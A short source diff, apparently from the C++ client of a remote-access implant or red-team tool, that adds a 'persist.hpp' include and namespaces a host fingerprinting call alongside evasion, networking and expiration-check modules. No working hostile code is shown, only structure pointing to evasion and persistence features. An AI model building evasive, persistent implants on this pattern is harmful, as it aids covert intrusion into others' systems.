@@ -9,6 +9,7 @@
 #include "local.hpp"
 #include "task.hpp"
 #include "evasion.hpp"
+#include "persist.hpp"
 #include "net.hpp"
 
 //only inclue the exact functions you need for client to work
@@ -30,7 +31,7 @@ int main(int argc, char** argv)
         goto EXIT;
     }
     //Get Enviroment Info
-    fingerprint();
+    Potlocal::fingerprint();
     //Check Expiration
     if (Potevade::checkExpire())
     {
